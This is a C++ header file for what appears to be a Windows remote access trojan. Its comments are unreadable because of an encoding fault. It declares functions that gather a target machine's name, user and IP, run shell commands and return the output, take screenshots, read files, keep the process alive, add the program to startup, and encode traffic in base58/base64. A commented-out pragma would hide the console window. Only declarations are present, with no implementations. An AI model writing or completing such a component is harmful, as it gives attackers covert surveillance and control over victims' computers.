#pragma once
#ifndef _TCPSOCKET_H_
#define _TCPSOCKET_H_
#define _CRT_SECURE_NO_WARNINGS 1
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <io.h>
#include <stdlib.h>
#include <vector>
#include <fstream>  //ifstream
#include <string>   //����getline()
#include <cmath>
#include <iostream>
#include <cstdlib>
#include <stdio.h>
#include <tchar.h>
#include <thread>
#include <atlimage.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
//����ʾ����̨��ɫ����
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define PORT 65533
#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
#define FileNameRow 200		//�����ȡ�ļ����Ķ�ά�����С
#define FileNameCol 50

using namespace std;

struct PC_Message
{
	char PCName[BUFSIZ];
	TCHAR UserName[BUFSIZ];
	char IP[16];
};
//�������
bool init_Socket();
//�ر������
bool close_Socket();
//���������socket
SOCKET CreatServerScoket();
//�����ͻ���socket
SOCKET CreatClientScoket(const char* ip);
//��ȡĿ��������IP����������Լ��û���
bool getmessage(struct PC_Message* messages);
//��TCHAR������ת��Ϊchar
bool TcharToChar(const TCHAR* tchar, char* _char);
//��������
bool HeartBeat(SOCKET fd);
//base58���뺯��
void base58encode(char plainText[]);
//base64���뺯��
void base64encode(char* str);
//���ܺ���
void encode(char* text);
//�����ػ�
void ProcessProtect();
//����������
void ComputerStart(char* pathName);
//ִ��shellָ��
int Execmd(char* shell, char* result);
//��ȡ�����ͼ
void ScreenShot(LPCTSTR s);
//���ļ�
void readSrc();
//��ȡ�ļ���
void GetFileName(char FileName[FileNameRow][FileNameCol]);

#endif // !_TCPSOCKET_H